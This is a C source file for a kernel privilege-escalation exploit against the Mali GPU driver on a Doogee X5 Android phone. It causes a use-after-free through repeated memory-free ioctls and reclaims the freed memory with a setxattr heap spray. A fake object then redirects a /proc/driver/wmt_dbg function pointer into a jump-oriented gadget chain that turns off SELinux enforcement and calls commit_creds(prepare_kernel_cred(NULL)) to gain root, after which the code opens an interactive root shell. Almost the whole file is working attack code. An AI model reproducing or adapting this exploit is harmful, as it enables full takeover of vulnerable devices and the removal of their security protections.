#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/xattr.h>
#include <errno.h>
#include <pthread.h>

#define MAX_ATTEMPTS 5
#define NUM_SPRAY_THREADS 100  // Increased for better coverage

// addresses for getting root
#define PREPARE_KERNEL_CRED_ADDR 0xc0046e44
#define COMMIT_CREDS_ADDR        0xc0046760
#define SELINUX_ENFORCING_ADDR   0xc0ff8e84

// IOCTL definitions - using the actual Mali device values
#define MALI_IOCTL_MEM_ALLOC 0xc0208300
#define MALI_IOCTL_MEM_FREE  0xc0108301

#define PAGE_SIZE 4096
#define MEM_SIZE (PAGE_SIZE)  // 64KB allocation size
#define FAKE_MALI_ALLOC_BUFF_SIZE 96 // used 

#define PROC_FILE "/proc/driver/wmt_dbg"
#define BUF_SIZE 4096

#define JOPCHAIN_BUFFER_SIZE 1024

typedef struct cred *(*prepare_kernel_cred_t)(void *);
typedef int (*commit_creds_t)(struct cred *);


/* Memory mapping structures - matching the device code */
typedef struct {
    unsigned long long ctx;      // User-kernel context
    unsigned int gpu_vaddr;      // GPU virtual address
    unsigned int vsize;          // Virtual size
    unsigned int psize;          // Physical size
    unsigned int flags;          // Flags
    unsigned long backend_handle; // Backend handle
} mali_mem_alloc;

typedef struct {
    unsigned long long ctx;      // User-kernel context
    unsigned int gpu_vaddr;      // GPU virtual address to free
    unsigned int free_pages_nr;  // Number of free pages
} mali_mem_free;

// spoofed structures for spray
struct allocation_manager {
    uint32_t vm_lock;           // offset 0x0 - set to 0x0
    uint8_t padding[0xc];       // padding to fill space
};

struct kernel_mutex {
    volatile int32_t lock_count;  // Must be at offset 0x0
    int32_t padding[3];           // Padding to get owner at offset 0x10
    void* owner;                  
};

// Structure for session
struct session {
    uint8_t padding[0xd8];               // padding to reach offset 0xe0
    struct allocation_manager alloc_mgr; // offset 0xd8 - allocation manager
    struct kernel_mutex mutex_lock;
};

// Structure for mali vma node
struct mali_vma_node {
    uint8_t padding[0x8];  
    uint32_t target_field;      // offset 0x8 - this needs to be 0
};

static struct allocation_manager g_alloc_mgr;
static struct session g_session;
static struct mali_vma_node g_vma_node;


// Mutex and condition variable for thread synchronization
pthread_mutex_t spray_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t spray_cond = PTHREAD_COND_INITIALIZER;

volatile int spray_flag = 0;    // Flag to trigger spray

// Structure to pass data to the spray thread
typedef struct {
    int thread_id;
    void *buffer;
    size_t length;
} spray_thread_data_t;

/**
 * Thread function that performs setxattr spray
 * Waits for spray_flag before proceeding
 */
void *spray_thread_func(void *arg) {
    spray_thread_data_t *data = (spray_thread_data_t *)arg;
    char filepath[64];
    char attr_name[32];
    int fd;
    
    // Create unique file for this thread
    snprintf(filepath, sizeof(filepath), "/data/local/tmp/spray_%d", data->thread_id);
    
    // Create the file
    fd = open(filepath, O_CREAT | O_RDWR, 0644);
    if (fd < 0) {
        perror("Failed to create spray file");
        free(data->buffer);
        free(data);
        return NULL;
    }
    // DON'T close(fd) - keep the file descriptor open to maintain inode reference!

    // Perform the spray - set xattr which allocates in kernel
    snprintf(attr_name, sizeof(attr_name), "user.spray%d", data->thread_id);

    // Wait for the spray flag to be set by main thread
    pthread_mutex_lock(&spray_mutex);
    while (!spray_flag) {
        pthread_cond_wait(&spray_cond, &spray_mutex);
    }
    pthread_mutex_unlock(&spray_mutex);


    // Try the exact size first
    if (setxattr(filepath, attr_name, data->buffer, data->length, 0) < 0) {
        perror("setxattr failed");
    }
    
    // DON'T clean up! Keep thread alive to maintain FD
    // Sleep forever - this keeps the file descriptor open
    // which maintains the inode reference and prevents xattr from being freed
    while (1) {
        sleep(1000);
    }
    
    return NULL;
}

void important_ascii_art() {
    printf("\n\033[38;5;225m");
    printf("███████ ██████  ███████ ██      ███████ \n");
    printf("\033[38;5;183m");
    printf("██      ██   ██ ██      ██      ██      \n");
    printf("\033[38;5;141m");
    printf("█████   ██████  █████   ██      ███████ \n");
    printf("\033[38;5;99m");
    printf("██      ██   ██ ██      ██           ██ \n");
    printf("\033[38;5;57m");
    printf("██      ██   ██ ███████ ███████ ███████ \n\n");
    printf("               Doogee X5\n");
    printf("\n\033[0m");
}

/**
 * Sets up a spray thread with setxattr
 * Thread will block until spray_flag is set
 */
int setup_spray_thread(int thread_id, const void *buffer, size_t length) {
    pthread_t thread;
    spray_thread_data_t *data;
    
    // Allocate memory for thread data
    data = (spray_thread_data_t *)malloc(sizeof(spray_thread_data_t));
    if (!data) {
        perror("Failed to allocate thread data");
        return -1;
    }
    
    // Allocate and copy the buffer
    data->buffer = malloc(length);
    if (!data->buffer) {
        perror("Failed to allocate buffer copy");
        free(data);
        return -1;
    }
    
    data->thread_id = thread_id;
    memcpy(data->buffer, buffer, length);
    data->length = length;
    
    // Create detached thread so it cleans up automatically
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    
    if (pthread_create(&thread, &attr, spray_thread_func, data) != 0) {
        perror("Failed to create thread");
        free(data->buffer);
        free(data);
        pthread_attr_destroy(&attr);
        return -1;
    }
    
    pthread_attr_destroy(&attr);
    
    return 0;
}

/**
 * Cleanup all spray files and close file descriptors
 */
void cleanup_spray_files() {
    char filepath[64];
    
    for (int i = 0; i < NUM_SPRAY_THREADS; i++) {
        snprintf(filepath, sizeof(filepath), "/data/local/tmp/spray_%d", i);
        unlink(filepath);
    }
}

int main() {
    important_ascii_art();

    int fd, i;
    void* mapped_region;

    // open /proc/driver/wmt_dbg for later
    int wmt_dbg_fd = open(PROC_FILE, O_RDONLY);
    if (wmt_dbg_fd < 0) {
        perror("open");
        return 1;
    }

    // Open the mali device
    fd = open("/dev/mali", O_RDWR);
    if (fd < 0) {
        perror("[-] Failed to open Mali device");
        return -1;
    }
    printf("[+] Opened Mali device: %d\n", fd);


    // init structures for UAF (fake mali_alloc)
    memset(&g_alloc_mgr, 0, sizeof(g_alloc_mgr));
    memset(&g_session, 0, sizeof(g_session));
    memset(&g_vma_node, 0, sizeof(g_vma_node));
    
    g_alloc_mgr.vm_lock = 0x0; // vm_lock at offset 0x0 = 0x0
    g_session.alloc_mgr = g_alloc_mgr;
    g_session.mutex_lock.lock_count = 1; // Initialize to unlocked state (1 = unlocked)
    g_session.mutex_lock.owner = 0x0;
    g_vma_node.target_field = 0x0; // mali vma node has 0 at offset 0x8


    // build the fake structure to spray
    uint32_t fake_mali_alloc_buff[FAKE_MALI_ALLOC_BUFF_SIZE / 4];
    memset(fake_mali_alloc_buff, 0x0, sizeof(fake_mali_alloc_buff));

    // set refcount to 1 to cause the free to be called in our UAF object
    fake_mali_alloc_buff[0x4c / 4] = 0x00000001; 

    // Set offset 0x3c to 0x00000000 (mali_alloc->mali_vma_node).field13_0x1c)
    fake_mali_alloc_buff[0x3c / 4] = 0x00000000;

    // Set offset 0xc (index 3) to contain pointer to session (requirement 2)
    fake_mali_alloc_buff[0xc / 4] = (uintptr_t)&g_session;

    // Set offset 0x20 (index 8) to contain pointer to mali vma node (requirement 3)
    fake_mali_alloc_buff[0x28 / 4] = 0x00000000; // set refcount to 1

    // overwrite list pointers to point to shellcode
    fake_mali_alloc_buff[0x40 / 4] = 0xc09bb2c0 - 0x4; // where to write it (wmt_dbg read function pointer)
    fake_mali_alloc_buff[0x44 / 4] = (uint32_t)0xc023ac68 - 0x4; // what to write (address of shellcode - 0x4)


    // Construct the JOP-chain the kernel will execute
    uint32_t jop_buffer[JOPCHAIN_BUFFER_SIZE / 4];
    memset(jop_buffer, 0, sizeof(jop_buffer));

    // Turns off selinux, then executes commit_creds(prepare_kernel_cred(NULL)) to get root

    // [G0] Save stack values
    // c023ac68 0d c0 a0 e1     cpy        r12,sp
    // c023ac6c f0 d8 2d e9     stmdb      sp!,{r4,r5,r6,r7,r11,r12,lr,pc}
    // c023ac70 04 b0 4c e2     sub        r11,r12,#0x4
    // c023ac74 04 30 91 e5     ldr        r3,[r1,#0x4]
    // c023ac78 01 50 a0 e1     cpy        r5,r1
    // c023ac7c 28 60 91 e5     ldr        r6,[r1,#0x28]
    // c023ac80 00 70 a0 e1     cpy        r7,r0
    // c023ac84 33 ff 2f e1     blx        r3

    // [G1] Load value into r0 (address of selinux enforcing)
    // c0083770 10 30 91 e5     ldr        r3,[r1,#0x10]
    // c0083774 00 50 a0 e1     cpy        r5,r0
    // c0083778 01 40 a0 e1     cpy        r4,r1
    // c008377c 18 00 91 e5     ldr        r0,[r1,#0x18]
    // c0083780 04 10 91 e5     ldr        r1,[r1,#0x4]
    // c0083784 33 ff 2f e1     blx        r3

    // [G2] Save 0 at enforcing
    // c0653300 1c 60 80 e5     str        r6,[r0,#0x1c]
    // c0653304 68 00 94 e5     ldr        r0,[r4,#0x68]
    // c0653308 08 30 90 e5     ldr        r3,[r0,#0x8]
    // c065330c 10 30 93 e5     ldr        r3,[r3,#0x10]
    // c0653310 33 ff 2f e1     blx        r3

    // [G3] Clear r0
    // c03a2af8 44 30 90 e5     ldr        r3,[r0,#0x44]
    // c03a2afc 00 00 a0 e3     mov        r0,#0x0
    // c03a2b00 33 ff 2f e1     blx        r3

    // [G4] Call prepare_kernel_cred
    // c05d1b74 74 30 94 e5     ldr        r3,[r4,#0x74]
    // c05d1b78 00 00 53 e3     cmp        r3,#0x0          // ignore
    // c05d1b7c 2a 00 00 0a     beq        LAB_c05d1c2c     // ignore
    // c05d1b80 33 ff 2f e1     blx        r3
    // c05d1b84 64 30 94 e5     ldr        r3,[r4,#0x64]
    // c05d1b88 33 ff 2f e1     blx        r3

    // [G5] Call commit_creds without touching r0
    // c05d135c 50 30 94 e5     ldr        r3,[r4,#0x50]
    // c05d1360 33 ff 2f e1     blx        r3
    // c05d1364 5c 30 94 e5     ldr        r3,[r4,#0x5c]
    // c05d1368 b4 00 d5 e1     ldrh       r0,[r5,#0x4]     // ignore, just make sure r5 is valid
    // c05d136c 33 ff 2f e1     blx        r3

    // [G6] Cleanup stack like nothing ever happened
    // c023acd4 04 00 a0 e1     cpy        r0=>DAT_fffffff4,r4
    // c023acd8 f0 a8 9d e8     ldmia      sp,{r4,r5,r6,r7,r11,sp,pc}

    jop_buffer[0x4 / 4] = 0xc0083770;                       // [G0] Address of G1
    jop_buffer[0x28 / 4] = 0x0;                             // [G0] Goes into r6, must be 0x0

    jop_buffer[0x10 / 4] = 0xc0653300;                      // [G1] Address of next gadget
    jop_buffer[0x18 / 4] = SELINUX_ENFORCING_ADDR - 0x1c;   // [G1] This is the address of the selinux enforcing
    // jop_buffer[0x4 / 4] = 0xc0083770;                    // [G1] IGNORE

    jop_buffer[0x68 / 4] = (uint32_t) jop_buffer;           // [G2] Gets loaded into r0 and gadget loaded from there
    jop_buffer[0x8 / 4] = (uint32_t) (jop_buffer - 1);      // [G2] Gets loaded into r3, must point to next gadget - 0x10
    jop_buffer[0xc / 4] = 0xc03a2af8;                       // [G2] Address of next gadget

    jop_buffer[0x44 / 4] = 0xc05d1b74;                      // [G3] Address of next gadget

    jop_buffer[0x74 / 4] = PREPARE_KERNEL_CRED_ADDR;        // [G4] Address of the function to call (prepare_kernel_cred)
    jop_buffer[0x64 / 4] = 0xc05d135c;                      // [G4] Address of the next gadget

    jop_buffer[0x50 / 4] = COMMIT_CREDS_ADDR;               // [G5] Address of the function to call (commit_creds)
    jop_buffer[0x5c / 4] = 0xc023acd4;                      // [G5] Address of the next gadget


    // Give the spray thread a moment to start
    usleep(100000);

    // should work first shot, if it doesnt the kernel will crash,
    // left the loop in anyway in case I fix it sometime
    for (int i = 0; i < MAX_ATTEMPTS; i++){
        // Reset spray flag
        pthread_mutex_lock(&spray_mutex);
        spray_flag = 0;
        pthread_mutex_unlock(&spray_mutex);


        // Allocate and map the mali_alloc we will be attacking
        printf("\n[1] Allocate and map mali GPU memory\n");

        mali_mem_alloc alloc_params;
        memset(&alloc_params, 0, sizeof(alloc_params));
        alloc_params.vsize = MEM_SIZE;
        alloc_params.psize = MEM_SIZE;
        alloc_params.flags = 0;
        
        if (ioctl(fd, MALI_IOCTL_MEM_ALLOC, &alloc_params) < 0) {
            printf("[-] Failed to allocate memory\n");
        }
        printf("[+] Allocated mali memory: GPU VA=0x%08x\n", 
            alloc_params.gpu_vaddr);
        
        // map the allocated mali_alloc object
        printf("[*] Mapping mali memory...\n");
        mapped_region = mmap(0x0, MEM_SIZE, PROT_READ | PROT_WRITE, 
                                    MAP_SHARED, fd, alloc_params.gpu_vaddr);
        
        if (mapped_region == MAP_FAILED) {
            printf("[-] mmap failed: %s\n", strerror(errno));
        } else {
            printf("[+] Mapped region %p\n", mapped_region);
        }


        // decrement the refcount
        printf("\n[2] Decrement refcount of mali_alloc object to 1 by calling MALI_IOCTL_MEM_FREE\n");
        mali_mem_free free_params;
        memset(&free_params, 0, sizeof(free_params));
        free_params.ctx = alloc_params.ctx;
        free_params.gpu_vaddr = alloc_params.gpu_vaddr;

        if (ioctl(fd, MALI_IOCTL_MEM_FREE, &free_params) < 0) {
            perror("[-] Free failed");
        } else {
            printf("[+] Memory freed (%d): %u pages\n", i, free_params.free_pages_nr);
        }


        printf("\n[3] Initialize setxattr spray threads\n");

        // Initialize threads - they will block waiting for spray_flag
        printf("[+] Initializing %d spray threads (they will wait for signal)...\n", NUM_SPRAY_THREADS);
        for (int j = 0; j < NUM_SPRAY_THREADS; j++){
            setup_spray_thread(j, fake_mali_alloc_buff, sizeof(fake_mali_alloc_buff));
        }

        // Give threads time to initialize and reach the wait point
        usleep(50000); 


        // now trigger the free of the object
        printf("\n[4] Cause first free of underlying mali_alloc with MALI_IOCTL_MEM_FREE\n");
        ioctl(fd, MALI_IOCTL_MEM_FREE, &free_params);


        // Signal all waiting threads to proceed with spray
        printf("\n[5] Tell setxattr spray threads to do their writes, one should get freed mali_alloc memory\n");
        pthread_mutex_lock(&spray_mutex);
        spray_flag = 1;
        pthread_cond_broadcast(&spray_cond);
        pthread_mutex_unlock(&spray_mutex);

        usleep(1000); // this is important, clearly the free of the mali_alloc takes a while

        int result = munmap(mapped_region, MEM_SIZE);

        usleep(1000); // not sure if needed


        printf("\n[6] Unmapping UAF mali_alloc to cause second free with controlled mali_alloc\n");

        if (result < 0) {
            perror("[-] munmap failed");
        } else {
            printf("[+] Unmapped successfully, might crash now...\n");
        }

        sleep(1);


        printf("\n[7] Didn't crash! Trigger the overwritten wmt_dbg function pointer to execute JOP-chain in kernel\n");

        ssize_t n = read(wmt_dbg_fd, jop_buffer, sizeof(jop_buffer) - 1);
        if (n < 0) {
            perror("read");
        }


        printf("\n[8] Did we get root?\n");
        sleep(1);

        // Check if we got root
        if (getuid() == 0) {
            printf("\n[+] SUCCESS! Got root! Might still crash tho lets wait a sec...\n");

            sleep(1);

            printf("[*] We're still alive, so popping shell!\n");
            char* shell = "/system/bin/sh";
            char* args[] = {shell, "-i", NULL};
            execve(shell, args, NULL);
        }

        printf("[-] Did not get root definitely gonna crash the kernel now RIP...\n");

        usleep(10000);

        cleanup_spray_files();
        
        // Reset spray flag for next attempt
        spray_flag = 0;
    }

    // Clean up
    cleanup_spray_files();
    close(fd);

    return 0;
}